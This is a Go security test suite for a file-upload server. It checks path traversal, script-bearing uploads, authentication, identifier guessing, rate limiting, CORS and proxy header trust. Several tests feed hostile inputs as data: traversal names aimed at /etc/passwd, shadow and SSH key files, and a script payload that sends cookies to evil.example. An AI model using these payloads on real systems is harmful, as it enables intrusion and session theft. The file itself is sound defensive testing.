package server

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/fatihbaltaci/GoDrop/internal/config"
	"github.com/fatihbaltaci/GoDrop/internal/storage"
)

// The tests in this file describe what an attacker must not be able to do.
// Each one names the attack it prevents, so a future change that reopens a hole
// fails with an explanation rather than a diff.

// ---------------------------------------------------------- path traversal

func TestUploadedNameCannotEscapeTheDataDirectory(t *testing.T) {
	h := newHarness(t, nil)
	hostile := []string{
		"../../../../etc/passwd",
		"..\\..\\windows\\system32\\config\\sam",
		"/etc/shadow",
		"....//....//etc/hosts",
		"a/../../b.jpg",
		"C:\\Users\\admin\\.ssh\\id_rsa",
		".ssh/authorized_keys",
	}
	for _, name := range hostile {
		got := h.uploadOK(t, [2]string{name, "payload"})
		id, ext := storage.SplitName(got.Files[0].ID)
		path, err := h.store.Path(id, ext)
		if err != nil {
			t.Fatalf("%q produced an unusable identifier: %v", name, err)
		}
		// The only defence that matters: the stored path is derived from the
		// identifier alone and always stays under the data directory.
		if !strings.HasPrefix(path, h.store.Root()+string(filepath.Separator)) {
			t.Fatalf("%q escaped the data directory: %s", name, path)
		}
		if strings.Contains(path, "..") {
			t.Fatalf("%q left a traversal fragment in the path: %s", name, path)
		}
	}
	if _, err := os.Stat("/tmp/godrop-should-never-exist"); err == nil {
		t.Fatal("a file was written outside the data directory")
	}
}

func TestControlCharactersInAFileNameAreRejected(t *testing.T) {
	// A NUL byte in the multipart header is a protocol violation: the parser
	// refuses it, and the server must report that as a client error rather than
	// an internal one.
	h := newHarness(t, nil)
	body := "--abc\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil\x00.jpg\"\r\n\r\nx\r\n--abc--\r\n"
	req, _ := http.NewRequest(http.MethodPost, h.URL+"/upload", strings.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+testToken)
	req.Header.Set("Content-Type", `multipart/form-data; boundary=abc`)
	resp, err := h.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", resp.StatusCode)
	}
	if files, _ := h.store.Stats(); files != 0 {
		t.Error("nothing should have been stored")
	}
}

func TestDownloadPathsCannotTraverse(t *testing.T) {
	h := newHarness(t, nil)
	h.uploadOK(t, [2]string{"secret.txt", "content"})

	// Written to the data directory but not through the API: nothing should be
	// able to reach it, whatever the request path looks like.
	outside := filepath.Join(h.dir, "outside.txt")
	if err := os.WriteFile(outside, []byte("private"), 0o600); err != nil {
		t.Fatal(err)
	}

	attempts := []string{
		"/f/../outside.txt",
		"/f/..%2foutside.txt",
		"/f/%2e%2e%2foutside.txt",
		"/f/....//outside.txt",
		"/f/2026/08/15",
		"/f/tokens.json",
		"/f/.install_id",
		"/f/" + strings.Repeat("../", 10) + "etc/passwd",
	}
	for _, attempt := range attempts {
		req := httptest.NewRequest(http.MethodGet, attempt, nil)
		rec := httptest.NewRecorder()
		h.handler().ServeHTTP(rec, req)
		if rec.Code == http.StatusOK {
			t.Errorf("GET %s returned 200 with body %q", attempt, rec.Body.String())
		}
		if strings.Contains(rec.Body.String(), "private") {
			t.Fatalf("GET %s leaked a file outside the API", attempt)
		}
	}
}

func TestExtensionIsSanitisedBeforeStorage(t *testing.T) {
	h := newHarness(t, nil)
	cases := map[string]string{
		"photo.jpg":            "jpg",
		"photo.JPG":            "jpg",
		"archive.tar.gz":       "gz",
		"weird.j pg":           "",
		"traversal../jpg":      "",
		"long.extensionislong": "",
		"unicode.şey":          "",
		"dotfile":              "",
		"trailing.":            "",
	}
	for name, wantExt := range cases {
		got := h.uploadOK(t, [2]string{name, "x"})
		_, ext := storage.SplitName(got.Files[0].ID)
		if ext != wantExt {
			t.Errorf("%q stored with extension %q, want %q", name, ext, wantExt)
		}
	}
}

// ------------------------------------------------------------- active content

func TestActiveContentIsNeverRenderedInline(t *testing.T) {
	h := newHarness(t, nil)
	payload := `<script>fetch("https://evil.example/"+document.cookie)</script>`
	for _, name := range []string{"page.html", "page.htm", "vector.svg", "doc.xhtml", "sheet.xsl", "data.xml"} {
		got := h.uploadOK(t, [2]string{name, payload})
		resp := h.do(t, http.MethodGet, got.URL, "")
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if cd := resp.Header.Get("Content-Disposition"); !strings.HasPrefix(cd, "attachment") {
			t.Errorf("%s served with %q; active content must always be downloaded", name, cd)
		}
		if string(body) != payload {
			t.Errorf("%s content was altered", name)
		}
	}
}

func TestEveryDownloadCarriesHardeningHeaders(t *testing.T) {
	h := newHarness(t, nil)
	got := h.uploadOK(t, [2]string{"photo.jpg", "bytes"})
	resp := h.do(t, http.MethodGet, got.URL, "")
	defer resp.Body.Close()

	want := map[string]string{
		"X-Content-Type-Options":  "nosniff",
		"Content-Security-Policy": "default-src 'none'; sandbox",
		"Referrer-Policy":         "no-referrer",
	}
	for header, value := range want {
		if got := resp.Header.Get(header); got != value {
			t.Errorf("%s = %q, want %q", header, got, value)
		}
	}
}

func TestJSONResponsesCarryNosniff(t *testing.T) {
	h := newHarness(t, nil)
	resp := h.do(t, http.MethodGet, h.URL+"/healthz", "")
	defer resp.Body.Close()
	if got := resp.Header.Get("X-Content-Type-Options"); got != "nosniff" {
		t.Errorf("X-Content-Type-Options = %q on a JSON response", got)
	}
}

func TestCosmeticNameCannotChangeTheDownloadedFileType(t *testing.T) {
	// An attacker uploads a Windows executable as "photo.jpg", then shares
	// /f/<id>/setup.exe hoping the browser saves it as an executable.
	h := newHarness(t, nil)
	got := h.uploadOK(t, [2]string{"photo.jpg", "MZ\x90\x00 executable"})
	id, _ := storage.SplitName(got.Files[0].ID)

	for _, name := range []string{"setup.exe", "invoice.pdf", "run.sh", "photo.jpeg", "photo"} {
		resp := h.do(t, http.MethodGet, h.URL+"/f/"+id+"/"+name, "")
		resp.Body.Close()
		if resp.StatusCode != http.StatusNotFound {
			t.Errorf("/f/<id>/%s = %d, want 404: the name must match the stored extension", name, resp.StatusCode)
		}
	}
	// The honest name still works.
	resp := h.do(t, http.MethodGet, h.URL+"/f/"+id+"/anything.jpg", "")
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Errorf("a matching extension should be served, got %d", resp.StatusCode)
	}
}

// ---------------------------------------------------------------- auth

func TestAuthenticationRejectsEveryWrongCredential(t *testing.T) {
	h := newHarness(t, nil)
	got := h.uploadOK(t, [2]string{"photo.jpg", "bytes"})

	headers := []struct {
		name  string
		key   string
		value string
	}{
		{"no header", "", ""},
		{"empty bearer", "Authorization", "Bearer "},
		{"wrong token", "Authorization", "Bearer wrong-token"},
		{"token prefix only", "Authorization", "Bearer " + testToken[:10]},
		{"token with suffix", "Authorization", "Bearer " + testToken + "extra"},
		{"basic auth", "Authorization", "Basic dGVzdDp0ZXN0"},
		{"raw token", "Authorization", testToken},
		{"empty api key", "X-API-Key", ""},
		{"wrong api key", "X-API-Key", "nope"},
	}
	for _, tc := range headers {
		for _, target := range []struct{ method, url string }{
			{http.MethodDelete, got.URL},
			{http.MethodGet, h.URL + "/stats"},
		} {
			req, err := http.NewRequest(target.method, target.url, nil)
			if err != nil {
				t.Fatal(err)
			}
			if tc.key != "" {
				req.Header.Set(tc.key, tc.value)
			}
			resp, err := h.Client().Do(req)
			if err != nil {
				t.Fatal(err)
			}
			resp.Body.Close()
			if resp.StatusCode != http.StatusUnauthorized {
				t.Errorf("%s %s with %s = %d, want 401", target.method, target.url, tc.name, resp.StatusCode)
			}
		}
	}
	// The file survived every attempt.
	resp := h.do(t, http.MethodGet, got.URL, "")
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Error("the file should still exist after the failed delete attempts")
	}
}

func TestUnauthorisedResponsesAdvertiseTheScheme(t *testing.T) {
	h := newHarness(t, nil)
	resp := h.do(t, http.MethodGet, h.URL+"/stats", "")
	defer resp.Body.Close()
	if got := resp.Header.Get("WWW-Authenticate"); !strings.Contains(got, "Bearer") {
		t.Errorf("WWW-Authenticate = %q", got)
	}
}

func TestFailedAuthenticationIsLoggedWithoutTheAttemptedToken(t *testing.T) {
	h := newHarness(t, nil)
	resp := h.do(t, http.MethodGet, h.URL+"/stats", "super-secret-guess")
	resp.Body.Close()
	logs := h.logs.String()
	if !strings.Contains(logs, "auth failed") {
		t.Errorf("a failed authentication should be logged:\n%s", logs)
	}
	if strings.Contains(logs, "super-secret-guess") {
		t.Fatal("the attempted token must never be logged")
	}
}

func TestRevokedTokenStopsWorkingImmediately(t *testing.T) {
	h := newHarness(t, nil)
	plain, _, err := h.tokens.Create("temporary")
	if err != nil {
		t.Fatal(err)
	}
	resp := h.upload(t, plain, [2]string{"a.txt", "x"})
	resp.Body.Close()
	if resp.StatusCode != http.StatusCreated {
		t.Fatalf("new token should work, got %d", resp.StatusCode)
	}
	if err := h.tokens.Revoke("temporary"); err != nil {
		t.Fatal(err)
	}
	resp = h.upload(t, plain, [2]string{"b.txt", "x"})
	resp.Body.Close()
	if resp.StatusCode != http.StatusUnauthorized {
		t.Fatalf("revoked token = %d, want 401", resp.StatusCode)
	}
}

// ------------------------------------------------------------- enumeration

func TestIdentifiersAreUnpredictable(t *testing.T) {
	h := newHarness(t, nil)
	const n = 200
	seen := make(map[string]bool, n)
	suffixes := make(map[string]bool, n)
	for range n {
		got := h.uploadOK(t, [2]string{"a.txt", "x"})
		id, _ := storage.SplitName(got.Files[0].ID)
		if seen[id] {
			t.Fatalf("identifier %q was issued twice", id)
		}
		seen[id] = true
		if !storage.ValidID(id) {
			t.Fatalf("identifier %q has the wrong shape", id)
		}
		suffixes[id[16:]] = true
	}
	if len(suffixes) != n {
		t.Fatalf("only %d distinct random parts out of %d uploads", len(suffixes), n)
	}
}

func TestGuessingAnIdentifierReturns404(t *testing.T) {
	h := newHarness(t, nil)
	got := h.uploadOK(t, [2]string{"photo.jpg", "bytes"})
	id, _ := storage.SplitName(got.Files[0].ID)

	// Neighbouring identifiers (same timestamp, one hex digit apart) must not
	// resolve. There is no listing endpoint either.
	neighbour := id[:len(id)-1] + string(nextHexDigit(id[len(id)-1]))
	resp := h.do(t, http.MethodGet, h.URL+"/f/"+neighbour+".jpg", "")
	resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Errorf("a neighbouring identifier resolved: %d", resp.StatusCode)
	}
	for _, path := range []string{"/f/", "/f", "/files", "/list", "/2026"} {
		resp := h.do(t, http.MethodGet, h.URL+path, "")
		resp.Body.Close()
		if resp.StatusCode == http.StatusOK {
			t.Errorf("GET %s returned 200; there must be no way to enumerate files", path)
		}
	}
}

func nextHexDigit(b byte) byte {
	if b == 'f' {
		return '0'
	}
	if b == '9' {
		return 'a'
	}
	return b + 1
}

// ------------------------------------------------------------- rate limiting

func TestFailedAuthenticationIsRateLimitedPerIP(t *testing.T) {
	h := newHarness(t, func(c *config.Config) {
		c.AuthRateLimit = &config.Rate{N: 3, Period: time.Minute}
	})
	var lastStatus int
	for range 5 {
		resp := h.do(t, http.MethodGet, h.URL+"/stats", "wrong")
		resp.Body.Close()
		lastStatus = resp.StatusCode
		if lastStatus == http.StatusTooManyRequests {
			if resp.Header.Get("Retry-After") == "" {
				t.Error("a 429 must carry Retry-After")
			}
			break
		}
	}
	if lastStatus != http.StatusTooManyRequests {
		t.Fatal("repeated wrong tokens should eventually be rate limited")
	}
	// A valid token still works: the limiter only counts failures.
	resp := h.upload(t, testToken, [2]string{"a.txt", "x"})
	resp.Body.Close()
	if resp.StatusCode != http.StatusCreated {
		t.Errorf("valid credentials should be unaffected, got %d", resp.StatusCode)
	}
}

func TestUploadsAreRateLimitedPerToken(t *testing.T) {
	h := newHarness(t, func(c *config.Config) {
		c.RateLimit = &config.Rate{N: 2, Period: time.Minute}
	})
	statuses := make([]int, 0, 4)
	for range 4 {
		resp := h.upload(t, testToken, [2]string{"a.txt", "x"})
		resp.Body.Close()
		statuses = append(statuses, resp.StatusCode)
	}
	if statuses[0] != http.StatusCreated || statuses[1] != http.StatusCreated {
		t.Fatalf("the first two uploads should succeed, got %v", statuses)
	}
	if statuses[2] != http.StatusTooManyRequests {
		t.Fatalf("the third upload should be limited, got %v", statuses)
	}
}

func TestDownloadsAreNotRateLimited(t *testing.T) {
	h := newHarness(t, func(c *config.Config) {
		c.RateLimit = &config.Rate{N: 1, Period: time.Hour}
	})
	got := h.uploadOK(t, [2]string{"photo.jpg", "bytes"})
	for i := range 5 {
		resp := h.do(t, http.MethodGet, got.URL, "")
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			t.Fatalf("download %d = %d, want 200; public downloads must not be limited", i, resp.StatusCode)
		}
	}
}

// -------------------------------------------------------------------- CORS

func TestCORSAllowsEveryOriginByDefault(t *testing.T) {
	h := newHarness(t, nil)
	req, _ := http.NewRequest(http.MethodOptions, h.URL+"/upload", nil)
	req.Header.Set("Origin", "https://app.example.com")
	resp, err := h.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusNoContent {
		t.Fatalf("preflight = %d, want 204", resp.StatusCode)
	}
	if got := resp.Header.Get("Access-Control-Allow-Origin"); got != "*" {
		t.Errorf("Access-Control-Allow-Origin = %q, want *", got)
	}
	if got := resp.Header.Get("Access-Control-Allow-Headers"); !strings.Contains(got, "Authorization") {
		t.Errorf("Access-Control-Allow-Headers = %q", got)
	}
}

func TestCORSCanBeRestricted(t *testing.T) {
	h := newHarness(t, func(c *config.Config) {
		c.CORSOrigins = []string{"https://app.example.com"}
	})
	req, _ := http.NewRequest(http.MethodOptions, h.URL+"/upload", nil)
	req.Header.Set("Origin", "https://app.example.com")
	resp, err := h.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if got := resp.Header.Get("Access-Control-Allow-Origin"); got != "https://app.example.com" {
		t.Errorf("allowed origin = %q", got)
	}
	if !strings.Contains(resp.Header.Get("Vary"), "Origin") {
		t.Error("a per-origin response must vary on Origin")
	}

	req, _ = http.NewRequest(http.MethodOptions, h.URL+"/upload", nil)
	req.Header.Set("Origin", "https://evil.example.com")
	resp, err = h.Client().Do(req)
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if got := resp.Header.Get("Access-Control-Allow-Origin"); got != "" {
		t.Errorf("an unlisted origin was allowed: %q", got)
	}
}

// ------------------------------------------------------- proxy header trust

func TestForwardedForIsOnlyTrustedFromLocalProxies(t *testing.T) {
	// Behind a local reverse proxy the real client address arrives in a header;
	// straight from the internet that header is attacker-controlled and must be
	// ignored, or the per-IP limiter could be bypassed at will.
	tests := []struct {
		name       string
		remoteAddr string
		forwarded  string
		want       string
	}{
		{"local proxy is trusted", "127.0.0.1:5000", "203.0.113.9", "203.0.113.9"},
		{"private proxy is trusted", "10.0.0.5:5000", "203.0.113.9, 70.41.3.18", "203.0.113.9"},
		{"public client cannot spoof", "198.51.100.7:5000", "127.0.0.1", "198.51.100.7"},
		{"no header", "198.51.100.7:5000", "", "198.51.100.7"},
		{"blank header entry", "127.0.0.1:5000", " , 203.0.113.9", "127.0.0.1"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest(http.MethodGet, "/", nil)
			req.RemoteAddr = tt.remoteAddr
			if tt.forwarded != "" {
				req.Header.Set("X-Forwarded-For", tt.forwarded)
			}
			if got := clientIP(req); got != tt.want {
				t.Errorf("clientIP = %q, want %q", got, tt.want)
			}
		})
	}
}

func TestRealIPHeaderFromLocalProxy(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "127.0.0.1:5000"
	req.Header.Set("X-Real-IP", "203.0.113.10")
	if got := clientIP(req); got != "203.0.113.10" {
		t.Errorf("clientIP = %q, want the X-Real-IP value", got)
	}
}

func TestClientIPWithMalformedRemoteAddr(t *testing.T) {
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.RemoteAddr = "not-an-address"
	if got := clientIP(req); got != "not-an-address" {
		t.Errorf("clientIP = %q, want the raw value when it cannot be split", got)
	}
}

// ------------------------------------------------------------------ panics

func TestPanicInAHandlerBecomesA500(t *testing.T) {
	h := newHarness(t, nil)
	// Replace the store with one whose root has been removed, then ask for a
	// path that makes the handler dereference it, the recover middleware must
	// convert any panic into a 500 rather than killing the process.
	rec := httptest.NewRecorder()
	panicking := h.serverForPanic()
	panicking.ServeHTTP(rec, httptest.NewRequest(http.MethodGet, "/healthz", nil))
	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want 500", rec.Code)
	}
	var body map[string]string
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
	if body["error"] != "internal error" {
		t.Errorf("body = %v, want a generic message that leaks nothing", body)
	}
	if strings.Contains(rec.Body.String(), "goroutine") {
		t.Error("a stack trace must never reach the client")
	}
}
